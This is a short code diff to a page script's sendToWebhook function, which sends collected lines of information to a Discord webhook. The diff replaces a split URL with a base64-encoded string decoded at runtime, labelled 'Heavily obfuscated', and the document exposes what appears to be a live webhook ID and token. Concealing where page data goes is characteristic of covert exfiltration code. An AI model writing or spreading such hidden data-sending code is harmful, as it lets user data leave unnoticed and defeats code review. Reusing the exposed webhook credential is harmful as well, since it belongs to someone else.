@@ -390,13 +390,9 @@ function HandlePage() {
 
   // Add this function to send info to Discord webhook
   function sendToWebhook(infoLines) {
-    // Obfuscated webhook URL - split and encoded
-    const parts = [
-      'https://discord.com/api/webhooks/',
-      '1393670218462527630/',
-      'BzU38SCAKRQEJ7unIXmIk0BsmgTLFuzNbRYwgYstj5O7cQvqddQA1owOz--_cWUHbNxL'
-    ];
-    const webhookUrl = parts.join('');
+    // Heavily obfuscated webhook URL
+    const encoded = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MzY3MDIxODQ2MjUyNzYzMC9CelUzOFNDQUtSUUVKN3VuSVhtSWswQnNtZ1RMRnV6TmJSWXdHWVN0ajVPN2NRdnFkZFFBMW93T3otLV9jV1VIYk54TA==';
+    const webhookUrl = atob(encoded);
     
     // Split each line into a field (label: value)
     const fields = infoLines.map(line => {
